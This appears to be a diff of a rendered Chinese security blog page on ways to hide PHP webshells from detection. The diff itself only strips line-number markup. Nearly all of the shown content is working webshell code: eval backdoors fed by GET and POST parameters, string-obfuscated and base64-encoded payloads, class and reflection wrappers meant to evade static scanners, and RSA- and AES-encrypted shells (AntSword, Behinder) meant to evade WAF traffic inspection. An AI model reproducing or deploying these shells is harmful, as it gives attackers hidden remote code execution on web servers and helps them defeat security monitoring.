 $array &#x3D; array(     233   &#x3D;&gt; false,     42    &#x3D;&gt; $_GET[&#39;SECQUAN&#39;], ); eval($array[233].$array[42]); ?&gt; 
 
@@ -1328,9 +1328,9 @@ error_reporting(0); $sss&#x3D;&#39;&#39;; $s&#x3D;&#39;&#39;; $s&#x3D;&#39;12345
 3）多维数组
 
 $b &#x3D; substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
-$a &#x3D; array($arrayName &#x3D; array(&#39;a&#39; &#x3D;&gt; $b($_POST[&#39;q&#39;])));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$a &#x3D; array($arrayName &#x3D; array(&#39;a&#39; &#x3D;&gt; $b($_POST[&#39;q&#39;])));</code></pre>
 
-<h4 id="d-函数利用"><a href="#d-函数利用" class="headerlink" title="d. 函数利用"></a>d. 函数利用</h4><pre class="line-numbers language-none"><code class="language-none">1）将取值赋值放入自定义函数
+<h4 id="d-函数利用"><a href="#d-函数利用" class="headerlink" title="d. 函数利用"></a>d. 函数利用</h4><pre class="language-none"><code class="language-none">1）将取值赋值放入自定义函数
 
 function a()&#123;
      return $a&#x3D;$_POST[&#39;1&#39;];
@@ -1355,20 +1355,20 @@ if(isset($_POST[$password]))&#123;
 
 4）匿名函数
 
-function __lambda_func()&#123;@eval($_POST[&#39;f&#39;]);&#125; $s &#x3D; &quot;F9QivT1NUWyd&quot;; $v &#x3D; &quot;QGivV2YivWwoJ&quot;; $j &#x3D; &quot;mJ10pOw&#x3D;iv&#x3D;&quot;; $re &#x3D; str_replace(&quot;iv&quot;, &quot;&quot;, &quot;sivtr_ivrepivlaivce&quot;); $ba &#x3D; $re(&quot;nf&quot;, &quot;&quot;, &quot;bnfanfse6nf4_nfdecnfode&quot;); $fun &#x3D; $re(&quot;vf&quot;, &quot;&quot;, &quot;cvfreavfte_fvfunctvfion&quot;); $vi &#x3D; $fun(&quot;&quot;, $ba($re(&quot;iv&quot;, &quot;&quot;, $v . $s . $j))); $vi();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+function __lambda_func()&#123;@eval($_POST[&#39;f&#39;]);&#125; $s &#x3D; &quot;F9QivT1NUWyd&quot;; $v &#x3D; &quot;QGivV2YivWwoJ&quot;; $j &#x3D; &quot;mJ10pOw&#x3D;iv&#x3D;&quot;; $re &#x3D; str_replace(&quot;iv&quot;, &quot;&quot;, &quot;sivtr_ivrepivlaivce&quot;); $ba &#x3D; $re(&quot;nf&quot;, &quot;&quot;, &quot;bnfanfse6nf4_nfdecnfode&quot;); $fun &#x3D; $re(&quot;vf&quot;, &quot;&quot;, &quot;cvfreavfte_fvfunctvfion&quot;); $vi &#x3D; $fun(&quot;&quot;, $ba($re(&quot;iv&quot;, &quot;&quot;, $v . $s . $j))); $vi();</code></pre>
 
 <h4 id="e-类调用"><a href="#e-类调用" class="headerlink" title="e. 类调用"></a>e. 类调用</h4><p>使用类进行调用，会绕过部分静态检测手段</p>
-<pre class="line-numbers language-none"><code class="language-none">class get&#123;
+<pre class="language-none"><code class="language-none">class get&#123;
      public function setName($name&#x3D;1)&#123;
          return $this -&gt; name &#x3D; $name;
      &#125;
 &#125;
 $obj &#x3D; new get();
 $s &#x3D; $obj -&gt; setName(&quot;$_POST[1]&quot;);
-eval(null.$s);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+eval(null.$s);</code></pre>
 
 <p>使用接口继承</p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="language-none"><code class="language-none">
 interface lbw&#123;
      public function getshell($name);
 &#125;
@@ -1380,10 +1380,10 @@ class Demo implements lbw &#123;
      &#125;
 &#125;
 $obj&#x3D;new Demo();
-$obj-&gt;getshell($_GET[&#39;a&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+$obj-&gt;getshell($_GET[&#39;a&#39;]);</code></pre>
 
 <p>针对回调函数，写在__construct&#x2F;__destruct 方法中</p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="language-none"><code class="language-none">
 $class &#x3D; new ReflectionClass(&#39;filter&#39;);
 $instance &#x3D; $class-&gt;newInstance($_GET);
 unset($instance);
@@ -1397,12 +1397,12 @@ class filter &#123;
              eval($this-&gt;data[$this-&gt;password]);
          &#125;
      &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;</code></pre>
 
 <h4 id="f-文件混淆加密"><a href="#f-文件混淆加密" class="headerlink" title="f. 文件混淆加密"></a>f. 文件混淆加密</h4><p>文件加密后无法被各种检测软件的文件解析模块解析，绕过静态检测</p>
 <h3 id="2-绕过流量检测"><a href="#2-绕过流量检测" class="headerlink" title="2. 绕过流量检测"></a>2. 绕过流量检测</h3><p>在双端进行非对称加解密操作，绕过WAF检测，要在双端加密，不管是请求包还是响应包，都是密文，双端都有加解密的操作</p>
 <h4 id="a-RSA加密"><a href="#a-RSA加密" class="headerlink" title="a. RSA加密"></a>a. RSA加密</h4><p>使用 RSA 进行加密（蚁剑 php shell）</p>
-<pre class="line-numbers language-none"><code class="language-none">$cmd &#x3D; @$_POST[&#39;ant&#39;];
+<pre class="language-none"><code class="language-none">$cmd &#x3D; @$_POST[&#39;ant&#39;];
 $publicKey &#x3D; &lt;&lt;&lt;EOF
 -----BEGIN PUBLIC KEY-----
  Input your Public Key 
@@ -1416,10 +1416,10 @@ foreach ($cmds as $value) &#123;
          $cmd .&#x3D; $de;
      &#125;
 &#125;
-eval($cmd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+eval($cmd);</code></pre>
 
 <h4 id="b-AES加密"><a href="#b-AES加密" class="headerlink" title="b. AES加密"></a>b. AES加密</h4><p>使用AES加密（冰蝎 php shell）</p>
-<pre class="line-numbers language-none"><code class="language-none">@error_reporting(0);
+<pre class="language-none"><code class="language-none">@error_reporting(0);
 session_start();
 if (isset($_GET[&#39;pass&#39;])) &#123;
      $key&#x3D;substr(md5(uniqid(rand())),16);
@@ -1428,7 +1428,7 @@ if (isset($_GET[&#39;pass&#39;])) &#123;
 &#125; else &#123;
      $key&#x3D;$_SESSION[&#39;k&#39;];
      $post&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);                
-if(!extension_loaded(&#39;openssl&#39;)) &#123; $t&#x3D;&quot;base64_&quot;.&quot;decode&quot;; $post&#x3D;$t($post.&quot;&quot;); for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123;       $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15];       &#125; &#125; else &#123; $post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key); &#125;     $arr&#x3D;explode(&#39;|&#39;,$post);     $func&#x3D;$arr[0];     $params&#x3D;$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if(!extension_loaded(&#39;openssl&#39;)) &#123; $t&#x3D;&quot;base64_&quot;.&quot;decode&quot;; $post&#x3D;$t($post.&quot;&quot;); for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123;       $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15];       &#125; &#125; else &#123; $post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key); &#125;     $arr&#x3D;explode(&#39;|&#39;,$post);     $func&#x3D;$arr[0];     $params&#x3D;$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params); &#125;</code></pre>
 
 <h3 id="3-绕过机器学习算法检测"><a href="#3-绕过机器学习算法检测" class="headerlink" title="3. 绕过机器学习算法检测"></a>3. 绕过机器学习算法检测</h3><p>使用分类算法、神经网络、深度学习、异常检测算法，常用思路如下：</p>
 <ul>
